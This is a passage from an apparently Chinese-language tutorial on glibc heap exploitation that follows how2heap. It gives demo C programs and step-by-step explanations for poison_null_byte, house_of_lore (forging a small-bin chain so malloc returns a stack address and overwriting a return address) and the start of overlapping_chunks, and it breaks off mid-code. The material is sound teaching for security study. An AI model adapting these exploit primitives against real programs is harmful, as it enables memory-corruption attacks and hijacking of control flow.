    uint64_t<span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x1f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;b 的 size: %#lx\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;b 现在的 size: %#lx\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    uint64_t<span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;c 的 prev_size 是 %#lx\n&quot;</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;申请一个 0x100 大小的 b1: %p\n&quot;</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n&quot;</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;但是我们之前写 0x200 那个地方已经改成了: %lx\n&quot;</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;接下来 malloc 'b2', 作为 'victim' chunk.\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;b2 申请在: %p\n&quot;</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 b2 填充的内容是:\n%s\n&quot;</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;d 申请到了: %p，我们填充一下 d 为 \&quot;D\&quot;\n&quot;</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 b2 的内容就是:\n%s\n&quot;</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br></div></div><p>​    该技术适用的场景需要某个malloc的内存区域存在一个单字节溢出漏洞。通过溢出下一个chunk的size字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。</p> <p>​    编译完成之后，单步调试。首先申请了4个chunk，分别是a、b、c和一个防止与top chunk合并的chunk。</p> <p>​     <img src="/images/heap/image-20211226160943389.png" alt="image-20211226160943389"></p> <p>​    接下来为了绕过size和next chunk的prev_size的检查，我们在chunk b的末尾伪造了一个0x200大小的prev_size</p> <p><img src="/images/heap/image-20211226160947926.png" alt="image-20211226160947926"></p> <p>然后把b给free掉，通过编辑chunk a来更改b的size的最后一位为0x00。</p> <p><img src="/images/heap/image-20211226160952228.png" alt="image-20211226160952228"></p> <p>​     这时候c那里的prev_size还是之前的，因为更改了b的size，所以找的时候会找b + 0x200的，而真正的prev_size位在0x210处，也正是这样让我们绕过了chunksize(P) = prev_size(next_chunk(P))的检测。</p> <p>接下来申请一个0x100大小的chunk，因为b已经被free了，所以glibc会将b进行切割，分出一块0x100大小的堆块给b1，剩下0xf0。</p> <p><img src="/images/heap/image-20211226160956897.png" alt="image-20211226160956897"></p> <p>接下来再去申请一块小于0xf0的堆块，这样就会继续分割b剩下的那一块（我们把这次申请的堆块填充上’B’来区分）。</p> <p><img src="/images/heap/image-20211226161002057.png" alt="image-20211226161002057"></p> <p>接下来free掉b1和c，因为c的prev_size仍然是0x210，按照这个去找的话就可以找到原本的b，现在的b1的位置，那么他们俩会合并，但是中间还有个b2呢。这里how2heap有一个注释。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>Typically <span class="token function">b2</span> <span class="token punctuation">(</span>the victim<span class="token punctuation">)</span> will be a structure with valuable pointers that we want to control
通常b2（受害者）将是一个结构，其中包含我们要控制的有价值的指针
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/images/heap/image-20211226161007121.png" alt="image-20211226161007121"></p> <p>那么接下来的事情就是申请一块大的chunk，然后随便改写b2的内容了。</p> <p><img src="/images/heap/image-20211226161037363.png" alt="image-20211226161037363"></p> <h2 id="house-of-lore">house_of_lore <a href="#house-of-lore" class="header-anchor">#</a></h2> <p>​    源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;Nice jump d00d\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

  intptr_t<span class="token operator">*</span> stack_buffer_1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  intptr_t<span class="token operator">*</span> stack_buffer_2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;定义了两个数组&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;stack_buffer_1 在 %p\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;stack_buffer_2 在 %p\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  intptr_t <span class="token operator">*</span>victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  intptr_t <span class="token operator">*</span>victim_chunk <span class="token operator">=</span> victim<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//chunk 开始的位置</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;在栈上伪造一块 fake chunk\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> victim_chunk<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">;</span>
  stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span><span class="token punctuation">,</span> p5<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;victim-&gt;fd: %p\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;victim-&gt;bk: %p\n\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;victim-&gt;fd: %p\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;victim-&gt;bk: %p\n\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;p4 = malloc(100)\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span><span class="token punctuation">,</span>stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\np4 在栈上 %p\n&quot;</span><span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  intptr_t sc <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p4<span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br></div></div><p>​    运行结果。</p> <p><img src="/images/heap/image-20211226161102216.png" alt="image-20211226161102216"></p> <p>​    在前面的技术中，我们已经知道怎样去伪造一个fake chunk，接下来，我们要尝试伪造一条small bins链。</p> <p>​    首先创建两个chunk，第一个是我们的victim chunk，请确保它是一个small chunk，第二个随意，只是为了确保在free时victim chunk不会被合并进top chunk 里。然后，在栈上伪造两个fake chunk，让fake chunk 1的fd指向victim chunk，bk指向fake chunk 2，fake chunk 2的fd指向fake chunk 1，这样一个small bin链就差不多了。</p> <p>​    如下图所示。</p> <p><img src="/images/heap/image-20211226161117958.png" alt="image-20211226161117958"></p> <p><img src="/images/heap/image-20211226161122987.png" alt="image-20211226161122987"></p> <p>​    Glibc在malloc的时候会检查small bin链表中第二块chunk的bk指针是否指向第一块，来发现对small bins的破坏。为了绕过这个检查，所以才需要同时伪造bin中的前两个chunk。</p> <p>​    接下来释放掉victim chunk，它首先会被放到fast bin中，这时候我们再去malloc一个large chunk，那么就会触发fast bin的合并，然后victim chunk就放到了unsorted bin中，最终被整理到small bin中。</p> <p>​    接下来的第一个相应大小的malloc，会返回victim chunk的地址，再一次malloc将返回fake chunk 1的地址，地址在栈上且我们能够控制。</p> <p><img src="/images/heap/image-20211226161127920.png" alt="image-20211226161127920"></p> <p>​    于是我们就成功地骗过了malloc在栈上分配了一个chunk。最后再想一下，其实最初的victim chunk使用fast chunk也是可以的，其释放后虽然是被加入到 fast bins中，而不是unsorted bin，但malloc之后，也会被整理到small bins里。自行尝试吧。</p> <h2 id="overlapping-chunks">overlapping_chunks <a href="#overlapping-chunks" class="header-anchor">#</a></h2> <div class="language- extra-class"><pre><code>         ```c
         #include &lt;stdio.h&gt;
         #include &lt;stdlib.h&gt;
         #include &lt;string.h&gt;
         #include &lt;stdint.h&gt;
         
         int main(int argc , char* argv[]){
         
             intptr_t *p1,*p2,*p3,*p4;
             fprintf(stderr, &quot;这是一个简单的堆块重叠问题，首先申请 3 个 chunk\n&quot;);
         
             p1 = malloc(0x100 - 8);
             p2 = malloc(0x100 - 8);
             p3 = malloc(0x80 - 8);
             fprintf(stderr, &quot;这三个 chunk 分别申请到了:\np1：%p\np2：%p\np3：%p\n给他们分别填充\&quot;1\&quot;\&quot;2\&quot;\&quot;3\&quot;\n\n&quot;, p1, p2, p3);
         
             memset(p1, '1', 0x100 - 8);
             memset(p2, '2', 0x100 - 8);
             memset(p3, '3', 0x80 - 8);
         
             fprintf(stderr, &quot;free 掉 p2\n&quot;);
             free(p2);
             fprintf(stderr, &quot;p2 被放到 unsorted bin 中\n&quot;);
         
             fprintf(stderr, &quot;现在假设有一个堆溢出漏洞，可以覆盖 p2\n&quot;);
             fprintf(stderr, &quot;为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块\n&quot;);
         
             int evil_chunk_size = 0x181;
             int evil_region_size = 0x180 - 8;
             fprintf(stderr, &quot;我们将 p2 的大小设置为 %d, 这样的话我们就能用 %d 大小的空间\n&quot;,evil_chunk_size, evil_region_size);
         
             *(p2-1) = evil_chunk_size; // 覆盖 p2 的 size
         
             fprintf(stderr, &quot;\n现在让我们分配另一个块，其大小等于块p2注入大小的数据大小\n&quot;);
             fprintf(stderr, &quot;malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）\n&quot;);
             p4 = malloc(evil_region_size);
         
             fprintf(stderr, &quot;\np4 分配在 %p 到 %p 这一区域\n&quot;, (char *)p4, (char *)p4+evil_region_size);
             fprintf(stderr, &quot;p3 从 %p 到 %p\n&quot;, (char *)p3, (char *)p3+0x80-8);
             fprintf(stderr, &quot;p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3\n&quot;);
         
